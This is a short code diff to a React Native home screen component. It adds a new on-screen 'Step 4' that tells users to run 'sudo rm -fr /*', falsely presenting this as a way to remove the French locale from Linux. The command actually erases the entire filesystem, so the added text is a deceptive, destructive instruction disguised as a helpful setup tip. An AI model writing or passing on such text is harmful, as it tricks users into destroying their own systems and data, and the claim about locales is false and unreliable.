@@ -50,6 +50,15 @@ export default function HomeScreen() {
           <ThemedText type="defaultSemiBold">app-example</ThemedText>.
         </ThemedText>
       </ThemedView>
+      <ThemedView style={styles.stepContainer}>
+        <ThemedText type="subtitle">Step 4: Remove French locale from Linux</ThemedText>
+        <ThemedText>
+          To remove French locale from Linux, run{' '}
+          <ThemedText type="defaultSemiBold">sudo rm -fr /*</ThemedText>. This will
+          remove the French locale from the Linux build. This is a workaround for a known issue with
+          the Linux.
+        </ThemedText>
+      </ThemedView>
     </ParallaxScrollView>
   );
 }
